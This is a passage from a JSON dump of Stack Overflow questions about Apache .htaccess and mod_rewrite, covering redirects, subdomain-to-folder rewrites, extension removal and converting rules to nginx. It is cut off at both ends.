it up and php exits. As in this question (http://stackoverflow.com/questions/5612735/using-mod-rewrite-to-view-cached-version-from-usual-url), I feel this is a waste of time. However, I have around 5,000 pages and as such, I would prefer not to place them all in the same /cache/ directory. I would instead like to place </p>\n\n<pre><code>/a-web-url/ in /cache/a/a-web-url.html.gz\n</code></pre>\n\n<p>and </p>\n\n<pre><code>/this-is-another-url/ in /cache/t/this-is-another-url.html.gz\n</code></pre>\n\n<p>I am currently working with </p>\n\n<pre><code>RewriteRule ^([A-Za-z0-9-_/\\.]+)/$ /cache/$1\n</code></pre>\n\n<p>However this assumes that all are in the same directory. I would prefer them to be divided into subdirectories. Thanks.</p>\n\n<p>Also note that all of my files end in .html.gz</p>\n"},{"tags":[".htaccess","redirect"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":17,"score":0,"question_id":13242087,"title":"Massive .htaccess Redirect","body":"<p>I got some problem on redirecting something.</p>\n\n<p>I tried to use Redirect 301 /link/link/link to /link/link</p>\n\n<p>Is there a way to make it more easier coz there are 100+ links I need to redirect.\nLike this \n/blog/category/energy-savings/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing</p>\n\n<p>/blog/category/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/</p>\n\n<p>/blog/category/uncategorized/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/about</p>\n\n<p>/blog/category/uncategorized/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/about</p>\n\n<p>/blog/category/uncategorized/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing</p>\n\n<p>/blog/category/uncategorized/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/about</p>\n\n<p>/blog/category/water-conservation/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing</p>\n\n<p>/blog/category/water-conservation/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/plumbing/about</p>\n\n<p>To the Homepage?</p>\n\n<p>Thanks</p>\n"},{"tags":[".htaccess","mod-rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":28,"score":2,"question_id":13235822,"title":"Using htaccess to strip domain name from URL","body":"<p>I'm not even sure if this is possible but have been looking everywhere for a solution.  My site generates dynamic info about domain names and people can view their info in the following format:</p>\n\n<pre><code>http://www.mysite.com/analyze/yourdomain.com\n</code></pre>\n\n<p>The problem is that sometimes people will enter http:// or www or even the full URL instead of their domain, such as this:</p>\n\n<pre><code>http://www.mysite.com/analyze/http://www.yourdomain.com/this-is-a-test\n</code></pre>\n\n<p>What I'd like to do with htaccess is get the domain name and redirect it to the proper URL like the first one listed.</p>\n\n<p>This is what I currently have for my htaccess:</p>\n\n<pre><code>RewriteEngine on\nRewriteCond %{HTTP_HOST} ^mysite.com$\nRewriteCond %{REQUEST_URI} !\\.(xml|txt)$\nRewriteRule ^(.*)$ http://www.mysite.com/review/$1 [R=301,L]\n\nOptions -MultiViews +FollowSymlinks -Indexes\n\nRewriteEngine on\nRewriteCond %{REQUEST_URI} !\\.(xml|txt)$\nRewriteRule ^([a-zA-Z0-9\\.\\-]+)$ review.php?site=$1 [L,QSA]\n</code></pre>\n\n<p>The main issue that I'm having is that every tutorial I find about stripping/redirecting domains is applying to my actual domain name, not the user's in the URL.  Any help would be greatly appreciated!</p>\n"},{"tags":[".htaccess","directory"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":13,"score":0,"question_id":13241317,"title":"htaccess How to make a folder a root locally","body":"<p>When I am am working locally on a site I want to use <em><code>/folder/item.ext</code></em> to reference what I need but because I am using xampp the forward-slash <code>/</code> will put me to the htdocs root.</p>\n\n<p>My directory looks like this:</p>\n\n<pre>\nhtdocs/\n   tutorials/\n       tutsite1.com/\n           index.html\n           style.css\n   websites/\n       mysite.com/\n           index.html\n           about.html\n           style.css\n       clientSite.com/\n           index.html\n           faq.html\n           style.css\n</pre>\n\n<p>Is there a way using <code>.htaccess</code> or other to make a file not go out of mysite.com or clientsite.com when referencing. IE make those sites the root for the content in then</p>\n\n<p>Regards, Pierce</p>\n"},{"tags":[".htaccess","redirect"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":24,"score":1,"question_id":13240996,"title":".htaccess invisible redirect to page within subfolder","body":"<p>I've tried many options in .htaccess without success. What I want to do is this:</p>\n\n<p>I have Wordpress residing in its own folder, like this: <code>site.com/folder</code></p>\n\n<p>I want all users visiting site.com to be redirected to <code>site.com/folder/page</code> but in such a way that the URL doesn't change in the browser. All other URLs, such as <code>site.com/folder</code> and <code>site.com/folder/page1 etc</code> shouldn't be affected.</p>\n\n<p>How to do this, in as SEO-friendly way as possible?</p>\n\n<p>Thanks everyone.</p>\n"},{"tags":[".htaccess","mod-rewrite","wampserver"],"answer_count":3,"favorite_count":3,"up_vote_count":5,"down_vote_count":0,"view_count":11307,"score":5,"question_id":4391530,"title":"How to use .htaccess in WAMP Server?","body":"<p>I searched in web for 2 days and I try to use htaccess in my local wamp but I can't! I know there is something wrong but I don't know where...</p>\n\n<p><strong>First:</strong> I activated \"*rewrite_module*\" in the apache menu, then I checked the phpinfo page and I saw that module added to its \"<em>Loaded Modules</em>\" part.</p>\n\n<p><strong>Second:</strong> I checked the httpd.conf and made some changes, it is the result (just important parts):</p>\n\n<pre><code>ServerRoot \"c:/program Files/wamp/bin/apache/apache2.2.11\"\nListen 80\nServerName localhost:80\nDocumentRoot \"c:/program Files/wamp/www/\"\n\n&lt;Directory /&gt;\nOptions FollowSymLinks\n# AllowOverride None\n# Order deny,allow\n# Deny from all\nAllowOverride all\nOrder Allow,Deny\nAllow from all\n&lt;/Directory&gt;\n\n&lt;Directory \"c:/program Files/wamp/www/\"&gt;\nOptions Indexes FollowSymLinks\nAllowOverride all\nOrder Allow,Deny\nAllow from all\n&lt;/Directory&gt;\n\nLoadModule alias_module modules/mod_alias.so\nLoadModule rewrite_module modules/mod_rewrite.so\n</code></pre>\n\n<p><strong>Next:</strong> I made an alias to my workspace. Here is contents of its .conf file:</p>\n\n<pre><code>Alias /basic_test/ \"e:/Projects/basic_test/\"\n\n&lt;Directory \"e:/Projects/basic_test/\"&gt;\nOptions Indexes FollowSymLinks MultiViews\nAllowOverride all\nOrder allow,deny\nAllow from all\n&lt;/Directory&gt;\n</code></pre>\n\n<p><strong>Next:</strong> I place a simple \"index.php\" and \"test.php\" in my workspace root and tested the alias by this addresses:\n--> \"*localhost/basic_test/index.php*\"\n--> \"*localhost/basic_test/test.php*\"\nThey worked perfectly...</p>\n\n<p><strong>Finally</strong>, I added a \".htaccess\" file to the root of my workspace (beside index.php), and I wrote in it:</p>\n\n<pre><code>&lt;IfModule mod_rewrite.c&gt;\nRewriteEngine on\nRewriteRule ^index.php$ test.php\n&lt;/IfModule&gt;\n</code></pre>\n\n<p>But the <strong>problem</strong> occurred when I tried to test the \".htaccess\" by this address:\n--> \"*localhost/basic_test/index.php*\"</p>\n\n<p>It show an error page with this message:\nOops! This link appears to be broken.</p>\n\n<p>Thanks in advance for your time and help...</p>\n"},{"tags":["apache",".htaccess"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":33,"score":0,"question_id":13240309,"title":"How can I rewrite a subdomain to go to a specific file in a specific folder?","body":"<p>I've done searching for my answer and have tested a few solutions, but nothing has worked so far. </p>\n\n<p>I'm trying to get a URL like this: </p>\n\n<p><a href=\"http://baseball.sports.com\" rel=\"nofollow\">http://baseball.sports.com</a></p>\n\n<p>to rewrite to...</p>\n\n<p><a href=\"http://pro.sports.com/baseball-index.php\" rel=\"nofollow\">http://pro.sports.com/baseball-index.php</a></p>\n\n<p>However, I still need to keep the domain the same (http://baseball.sports.com). The reason being I have about 5 subdomains (baseball, football, soccer, etc) that I want to run off the same code base (pro.sports.com). </p>\n\n<p>Everything is on the same server. I'd be happy to answer any other questions that would help me get a resolution. </p>\n\n<p>I truly appreciate any direction that can be given to me to solve this.</p>\n\n<p>Thanks!</p>\n\n<p>--Nick</p>\n"},{"tags":["php",".htaccess","url","rewrite"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":36,"score":0,"question_id":13238771,"title":"Removing .php extension through .htaccess simply will not work","body":"<p>Okay, so I've been through enough tutorials and duplicate methods to know that I'm getting nowhere in removing the PHP extensions from my web pages.</p>\n\n<pre><code>RewriteEngine On \nRewriteCond %{REQUEST_FILENAME} !-d \nRewriteCond %{REQUEST_FILENAME}\\.php -f \nRewriteRule ^(.*)$ $1.php\n</code></pre>\n\n<p>This is a typical example of what I've tried to use, placing it carefully in the root directory.</p>\n\n<p>It, as well as many others I have tried, is failing to remove the .php extensions from my site pages. I'm therefore wondering what configuration I might be missing or other obscure factors as to why I'm struggling to get the desired result.</p>\n\n<p>Any/all help is greatly appreciated!</p>\n"},{"tags":["php",".htaccess","url-rewriting"],"answer_count":4,"favorite_count":2,"up_vote_count":3,"down_vote_count":0,"view_count":77,"score":3,"question_id":12057121,"title":"how to rewrite a url with two variables using .htaccess","body":"<p>i want rewrite it with a .htaccess i have this url:</p>\n\n<pre><code>../index.php?page=details&amp;id=123456\n</code></pre>\n\n<p>like this:</p>\n\n<pre><code>../detail/123456\n</code></pre>\n\n<p>but I do not really know how to do this. Could you help me to rewrite this url?\nor give me a simple example that I can understand how it works</p>\n"},{"tags":["php",".htaccess","subdomain","wildcard","godaddy"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":1053,"score":1,"question_id":5929129,"title":"Can I dynamically create subdomains (PHP, .htaccess) with GoDaddy Hosting?","body":"<p>I am trying to use a combination of .htaccess and PHP to create subdomains on-the-fly on my GoDaddy Hosting account. I've run into a problem of trying to modify the zone using the wildcard asterisk. I am not at all familiar with how this works and have only found the zone stuff about the domain by exploring the domain manager extensively. I'm not sure I know what I'm doing. I'm slightly more acquainted with .htaccess, although it's still a big challenge for me to write RegEx.</p>\n\n<p>I've researched another tutorial that will use .htaccess to reroute a subdomain to a folder in the root of my domain (e.g. sub.domain.com to domain.com/sub). Here's my code:</p>\n\n<pre><code>#Grab the subdomain from the domain\nRewriteCond %{HTTP_HOST} ^([^.]+).MY-DOMAIN.com$\n#Make sure the subdomain is not www or example\nRewriteCond %{1} !^(www)$\n#Check if the directory actually exists before we go there\nRewriteCond /home/content/X/Y/Z/XYZ-MY-GODADDY-ACCT/html/%1 -d\n#This stops it from looping\nRewriteCond %{REQUEST_FILENAME} !^/home/content/X/Y/Z/XYZ-MY-GODADDY-ACCT/html/\n#Finally, this is the actual rewrite\nRewriteRule (.*) /home/content/X/Y/Z/XYZ-MY-GODADDY-ACCT/html/%1 [L]\n</code></pre>\n\n<p>As of right now, I've done the following:</p>\n\n<ol>\n<li>Logged into GoDaddy Domain Manager.</li>\n<li>Went to Tools > DNS Manager.</li>\n<li>Opened the Zone File Editor for my domain.</li>\n<li>Added an A (Host) Record with Host Name * and in Points to IP Address I copied the value from the @ entry's IP address, since that should be the same as my domain...?</li>\n<li>Now, after waiting until the nameservers or whatever updated and propogated and stuff, I get a 403 error when I try to access a subdomain.</li>\n</ol>\n\n<p>Any suggestions?</p>\n"},{"tags":[".htaccess","mod-rewrite","redirect"],"answer_count":8,"favorite_count":17,"up_vote_count":27,"down_vote_count":0,"view_count":52255,"score":27,"question_id":990392,"title":".htaccess rewrite to redirect root URL to subdirectory","body":"<p>Trying to get</p>\n\n<pre><code>www.example.com\n</code></pre>\n\n<p>to go directly to</p>\n\n<pre><code>www.example.com/store\n</code></pre>\n\n<p>I have tried multiple bits of code and none work. Please help!</p>\n\n<p>What I've tried:</p>\n\n<pre><code>Options +FollowSymlinks\nRewriteEngine on\n\nRewriteCond %{HTTP_HOST} ^example.com$\nRewriteRule (.*) http://www.example.com/$1 [R=301,L]\n\nRewriteCond %{HTTP_HOST} ^(.+)\\www.example\\.com$\nRewriteRule ^/(.*)$ /samle/%1/$1 [L]\n</code></pre>\n\n<p>What am I doing wrong?</p>\n"},{"tags":[".htaccess","http","https","rewrite","no-www"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":21,"score":0,"question_id":13238439,"title":"htaccess rewrite www to non-www https","body":"<p>I need your help to solve two rewrite issues:</p>\n\n<ol>\n<li><p>How to rewrite all</p>\n\n<p><code>www.mydomain.com and https://www.mydomain.com to be https://mydomain.com</code></p></li>\n<li><p>How to rewrite</p></li>\n</ol>\n\n<blockquote>\n  <p>www.mydomain.com to <a href=\"http://mydomain.com\" rel=\"nofollow\">http://mydomain.com</a></p>\n</blockquote>\n\n<p>Thanks in advance.</p>\n"},{"tags":[".htaccess"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":14,"score":0,"question_id":13237274,"title":"If 404, redirect to dynamic URL","body":"<p>I have 200+ pages that recently had their url structure changed from <strong>/post-name-here</strong> to <strong>/track/post-name-here</strong>. I know 301 redirects are best practice, but that would be a LOT of work.</p>\n\n<p>Is there a way to do this:</p>\n\n<p>1) User goes to old URL, resulting in 404</p>\n\n<p>2) .htaccess automatically tries 301 redirecting them to that url with /track/ prepended</p>\n\n<p>Any suggestions would be appreciated!</p>\n"},{"tags":[".htaccess","redirect"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":34,"score":0,"question_id":13234677,"title":"redirect domain.com/contact.html to newdomain.com/contact.html","body":"<p>I want to redirect an html page which is a contact form like this <code>www.abc.com/contact.html</code>  to a different domain but without <strong>www</strong> like this   <code>xyz.com/contact.html</code>.</p>\n\n<p>I am having 2 domains with same data (Just the domain names are different). The form on xyz.com is working perfectly fine, but the form on abc.com is not working even though the code on both domains is 100% same. </p>\n"},{"tags":[".htaccess","redirect"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":12,"score":0,"question_id":13235054,"title":"how to redirect all www traffic with htaccess to equal non-www pages","body":"<p>Question is pretty simple I guess, but I fail to do this myself.</p>\n\n<p>I have a website on <a href=\"http://website.com\" rel=\"nofollow\">http://website.com</a> and want to 301 redirect ALL requests on www.website.com to <a href=\"http://website.com/\" rel=\"nofollow\">http://website.com/</a> but make sure all directories and filenames stay the same (so not all requests end up at the homepage).</p>\n\n<p>So whatever people may type (like www.website.com/something.here) should 301 redirect to website.com/something.here</p>\n\n<p>How to do this?</p>\n"},{"tags":["wordpress",".htaccess","web-hosting"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":15,"score":1,"question_id":13234434,"title":"Disable all parent htaccess","body":"<p>I have wordpress installed in the root of my website public_html</p>\n\n<p>Although I have other folder inside a projects folder running their own websites.</p>\n\n<p>The .htaccess in the wordpress folder (parent-most folder) might be causing issues for the inside folders.</p>\n\n<p>Is there a way, I can mention for a folder not to look any higher for htaccess files ?</p>\n\n<p>DETAIL:</p>\n\n<p>The two main issues I am currently having our\n- if I set the status code to 500, I am get redirected to my home page (index.php)\n- if a page is not found, it gets redirected to index.php</p>\n\n<p>Thanks.</p>\n"},{"tags":[".htaccess","mod-rewrite"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":9,"score":-1,"question_id":13233950,"title":"How to write rule for # based url in .htaccess","body":"<p>I have a url </p>\n\n<p><a href=\"http://www.my-domain.com/path#goto=anotherpath\" rel=\"nofollow\">http://www.my-domain.com/path#goto=anotherpath</a></p>\n\n<p>and i want to apply condition in .htaccess and redirect the above url to </p>\n\n<p><a href=\"http://www.my-domain.com/anotherpath\" rel=\"nofollow\">http://www.my-domain.com/anotherpath</a></p>\n\n<p>Thanks,</p>\n\n<p>Shahzad</p>\n"},{"tags":["regex","apache",".htaccess","mod-rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":14,"score":1,"question_id":13233630,"title":"htaccess 301 redirect after change in one part of the url","body":"<p>how do I redirect urls from old url to new url? Here is the case:</p>\n\n<pre><code>http://www.lorem.com/ipsum/dolor/sit -&gt; http://www.lorem.com/ipsum/dolor/amet\nhttp://www.lorem.com/ipsum/dolor/sit/lipsum -&gt; http://www.lorem.com/ipsum/dolor/amet/lipsum\nhttp://www.lorem.com/ipsum/dolor/sit/vulvat -&gt; http://www.lorem.com/ipsum/dolor/amet/vulvat\nhttp://www.lorem.com/ipsum/dolor/sit/lol    -&gt; http://www.lorem.com/ipsum/dolor/amet/lol\n</code></pre>\n\n<p>The customer has renamed <code>sit</code> to <code>amet</code>. Do I have to create one redirect per link, or can I redirect <code>sit</code> to <code>amet</code> and all the pages under <code>sit</code> in one go?</p>\n"},{"tags":["php","wordpress",".htaccess","google-analytics","utm"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":19,"score":0,"question_id":13233337,"title":"How to add Googles utm_source variable in Wordpress?","body":"<p>I am using a permalink structure in wordpress like <code>www.domain.com/sample-post/</code> but it blocks naturally all parameters which it doesnt know.  </p>\n\n<p>I actually just want to add Googles <code>?utm_source=</code> variable to some links to track some sources, but Wordpress blocks them and i get a 404 error with a <code>/none</code> output in my logs. </p>\n\n<p>Do you have an idea how to fix that?</p>\n"},{"tags":["apache",".htaccess","nginx"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":8,"score":0,"question_id":13231069,"title":"COnvert htaccess to nginx config","body":"<p>I don't get it. Tried several converters and tutorial, nothing is working.\nMaybe someone can help me? MOving to nginx server and i try to put the htaccess below into config.</p>\n\n<pre><code>RewriteEngine On\nRewriteCond %{REQUEST_FILENAME} -s [OR]\nRewriteCond %{REQUEST_FILENAME} -l [OR]\nRewriteCond %{REQUEST_FILENAME} -d\nRewriteRule ^.*$ - [NC,L]\nRewriteRule ^.*$ /index.php [NC,L]\n</code></pre>\n"},{"tags":["php",".htaccess","codeigniter","subdomain"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":54,"score":0,"question_id":13227773,"title":"codeigniter www subdomain issue","body":"<p>I have strange issue with codeigniter and www subdomain.</p>\n\n<p>When i load <a href=\"http://foobar.com\" rel=\"nofollow\">http://foobar.com</a> the page opens normally but when i load <a href=\"http://www.foobar.com\" rel=\"nofollow\">http://www.foobar.com</a> I get CodeIgniter's 404 message</p>\n\n<p>Here is the content of .htaccess file</p>\n\n<pre><code>RewriteEngine on\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule ^(.*)$ index.php/$1 [L]\n</code></pre>\n\n<p>What could be the problem ?</p>\n"},{"tags":[".htaccess","subdomain"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":11,"score":0,"question_id":13231143,"title":"rewrite subdomains to subdirectories","body":"<p>I need to rewrite any subdomain to the correspoding subdirectory using .htaccess</p>\n\n<p>For example rewrite sub1.site.com to site.com/sub1 and make that subdomain show the content of directory sub1 without revealing the real address!</p>\n\n<p>Here is the code  I use:</p>\n\n<pre><code>RewriteEngine On\n# Skip www.site.com\nRewriteCond %{HTTP_HOST} !^www\\.\nRewriteCond %{HTTP_HOST} ^([^.]+)\\.site\\.com\nRewriteRule ^/(.*)$  %1/$1 [L]\n</code></pre>\n\n<p>But nothing happens!</p>\n\n<p>How can I fix it? and after changing the .htaccess , should I restart PC or clear cache or anything?</p>\n"},{"tags":[".htaccess"],"answer_count":0,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":10,"score":1,"question_id":13230984,"title":".htaccess setting the include path as document_root variable","body":"<p>This has been driving me crazy all morning.</p>\n\n<p>We are developing a website across multiple machines using git.</p>\n\n<p>In the majority of cases we can set up our computers to have the same set ups as the development server. unfortunately one person in the team is on windows, and it is causing all kinds of havoc. </p>\n\n<p>The main issue I am wanting to resolve is:</p>\n\n<p>In my .htaccess file i am using <code>php_value auto_prepend_file default_roots.php</code> </p>\n\n<p>and when writing an auto prepend stament I am aware that you have to use the absolute path to the file you are calling.\nThis is what is causing the problem, the absolute path on the windows machine will be different to the paths on any other machine in the office which have all been set up to match.</p>\n\n<p>what would solve my problem would be to be able to set the include_path within .htaccess as %{DOCUMENT_ROOT} then I could place the file in document root on any machine and the absolute path to the file would always be correct.</p>\n\n<p>Unfortunately it doesn't look like this is possible (or I am hopefully just getting my syntax wrong and someone can show me how it is done)</p>\n\n<p>I had considered writing different .htaccess files across different machines and environments and using gitignore to stop them from interfering with each other. That is where I started, but getting people to actually use gitignore and for it to stop them interfering seemed to be a problem and numerous times I have had to go in and fix it. It is also somewhat less elegant in my opinion.</p>\n\n<p>So I am hoping someone within the community has a solution for me, as I am going crazy here.</p>\n\n<p>Cheers</p>\n"},{"tags":["asp.net",".htaccess","iis","seo"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":34,"score":0,"question_id":13230781,"title":"How to use redirection 301","body":"<p>i create a .htaccess file and upload it on website root folder but redirection is not working .</p>\n\n<p>.htaccess file code</p>\n\n<pre><code> redirect 301 /source.aspx http://www.example.com/destination.aspx\n</code></pre>\n"},{"tags":["php",".htaccess","variables","mod-rewrite"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":20,"score":0,"question_id":13230653,"title":"htaccess and environment variables","body":"<p>I'll start by saying I always struggle with htaccess stuff :-( However, I have a working htaccess file with a number of   RewriteConds - these all use the F flag to activate a PHP 403 script. </p>\n\n<p>I'm trying to improve this by passing a variable identifying the RewriteCond that was matched to the script so it can perform different actions (send a mail, log to a database, do nothing etc).</p>\n\n<p>This works OK on my development server using Apache2.2 - it invokes he 403 handler and I can 'see' the variable. But my shared hosting account uses Apache 2.0 and I think thats causing the variables not to be passed? </p>\n\n<p>The sort of thing I'm doing is...</p>\n\n<pre><code># Block query strings longer than 64 chars\nRewriteCond %{QUERY_STRING} ([a-zA-Z0-9]{64}) [NC]\n# Set the rule variable\nRewriteRule ^ -  [E=HTTP_BLOCK_RULE:QUERY_LENGTH]\n\n# More tests...\n\n#Rewrite if HTTP_BLOCK_RULE is set\nRewriteCond %{ENV:HTTP_BLOCK_RULE} !^$\nRewriteRule ^(.*)$ - [F]\n</code></pre>\n\n<p>I've also tried passing the variable as a query string to the script but I think the F flag is stopping that working.</p>\n\n<p>Any helpful thoughts or suggestions appreciated...</p>\n"},{"tags":[".htaccess","mod-rewrite"],"answer_count":2,"favorite_count":1,"up_vote_count":3,"down_vote_count":0,"view_count":28,"score":3,"question_id":13225088,"title":".htaccess RewriteRule returns a blank page","body":"<p>I'm trying to solve this for more than two hours now.\nI have a personal site which uses .htaccess to manage urls.\nIt looks like this:</p>\n\n<pre><code>RewriteEngine on\nRewriteBase /\n...\nRewriteRule ^sklad/?$ index.php?action=sklad\nRewriteRule ^sklad/user/([0-9]+)?$ index.php?action=sklad&amp;user=$1\nRewriteRule ^sklad/folder/(.+)?$ index.php?action=sklad&amp;folder=$1\nRewriteRule ^sklad/file/(.+)?$ engine/ajax/sklad.php?file=$1\nRewriteRule ^sklad/logout/?$ index.php?action=sklad&amp;op=logout\n...\nRewriteRule ^admin/?$ admin.php\nRewriteRule ^admin/news/?$ admin.php?action=news\n</code></pre>\n\n<p>the first five ones work fine. The <strong>admin/</strong> one works fine. But when I try to access <strong>admin/news/</strong>, I get a blank page. No errors displayed or logged by Apache, and no output. <strong>admin.php?action=news</strong> is working fine.</p>\n\n<p>Both <strong>sklad/</strong> and <strong>admin/</strong> folders physically exist on the server. <strong>BUT</strong> when I rename the admin/ folder to something else <strong>OR</strong> change the the last RewriteRule to something like </p>\n\n<pre><code>RewriteRule ^admin123/news/?$ admin.php?action=news\n</code></pre>\n\n<p>I can access <strong>admin123/news/</strong>. If it has something to do with the actual folder existing on the server, then why the first five rules are working? This doesn't make sense.</p>\n\n<p>I'm out of ideas, hope someone here helps...</p>\n"},{"tags":["php",".htaccess","mod-rewrite","cross-domain","cname"],"answer_count":5,"favorite_count":4,"up_vote_count":10,"down_vote_count":0,"view_count":351,"score":10,"question_id":11703637,"title":"How to blogger/wordpress/tumlr allow users to mask url","body":"<p>I am creating a <code>saas</code> application. Users have their own url like <strong>user</strong>.mysaasapp.com</p>\n\n<p>To allow user to have own url, I use mod rewrite. Something like <code>http://mysaasapp.com/?user=user</code> to <code>user.mysaasapp.com</code> (This is working perfectly)</p>\n\n<p>Now, I want to give user the flexibility to mask their url. This means that user can direct their subdomain (saas.theirdomain.com) to user.mysaasapp.com. How do i go about doing so. </p>\n\n<p>I read many articles(cname) on this but still have not have a definite solution. I am wondering how big companies like wordpress/google does that.</p>\n\n<p>e.g <a href=\"http://www.tumblr.com/docs/en/custom_domains\" rel=\"nofollow\">http://www.tumblr.com/docs/en/custom_domains</a></p>\n\n<p>e.g <a href=\"http://developer.uservoice.com/docs/site/domain-aliasing/\" rel=\"nofollow\">http://developer.uservoice.com/docs/site/domain-aliasing/</a></p>\n\n<p>I realize that companies would take this process:</p>\n\n<ol>\n<li>Get user to add cname</li>\n<li>Get user to enter their domain in the saas app (maybe under custom domain)</li>\n</ol>\n\n<p>What is needed from me the get this working? Thanks!</p>\n"},{"tags":["apache",".htaccess","nginx"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":2,"view_count":22,"score":-2,"question_id":13229029,"title":"Convert these apache .htaccess rules to nginx","body":"<p>I am a project manager on personnal project with my dad. I change our webserver in nginx package, and it's almost working, but I still have a last problem with the past htaccess and the new way to write rules in nginx.</p>\n\n<p>stage/.htaccess :</p>\n\n<pre><code>SetEnv PHP_VER 5\nSetEnv REGISTER_GLOBALS 0\nErrorDocument 404 /404\nAddType application/x-httpd-php .php .php5 .tpl\nAddHandler x-httpd-php .php .php5 .tpl\nAddType text/cache-manifest .appcache\nDirectoryIndex index\nRewriteBase /\nRewriteEngine on\n###############################################################################\nRewriteCond %{REQUEST_FILENAME} !-f \nRewriteRule ^gateway.php(.*)$ gateway.php?$1 [L,QSA]\n###############################################################################\nRewriteRule ([^\\.]+)\\.xml$ run.php5?url=$1&amp;params=&amp;fullurl=$1&amp;xml=1 [L,QSA]\n###############################################################################\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteRule ^ajax\\.?(.*)$ /site/$1 [L,QSA]\n###############################################################################\nFileETag None\n&lt;FilesMatch \"\\.(ico|pdf|mov|flv|jpg|jpeg|png|gif|js|css|swf)$\"&gt;\nSetOutputFilter DEFLATE\n&lt;/FilesMatch&gt;\n###############################################################################\n&lt;Limit GET POST PUT&gt;\nOrder Allow,Deny\nAllow from all\n&lt;/Limit&gt;\n###############################################################################\nRewriteCond %{REQUEST_FILENAME} private/.* [OR] \nRewriteCond %{REQUEST_FILENAME} _emails_debug/.* [OR]\nRewriteCond %{REQUEST_FILENAME} site/.*\nRewriteRule ^.*$   -   [F,L]\n###############################################################################\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteRule ^thumb\\/([^,]+),([0-9]+),([0-9]+)$ _thumb.php5?s=$1&amp;w=$2&amp;h=$3 [L,QSA]\nRewriteRule ^thumb\\/([^,]+),([0-9]+)x([0-9]+)$ _thumb.php5?s=$1&amp;w=$2&amp;h=$3 [L,QSA]\nRewriteRule ^thumb\\/([^,]+),([0-9]+)=([0-9]+)$ _thumb.php5?s=$1&amp;w=$2&amp;h=$3&amp;crop=1 [L,QSA]\nRewriteRule ^get\\/(.*)$ _get.php5?file=$1 [L,QSA]\nRewriteRule ^(favicon.ico)$ $1 [L,QSA]\nRewriteRule 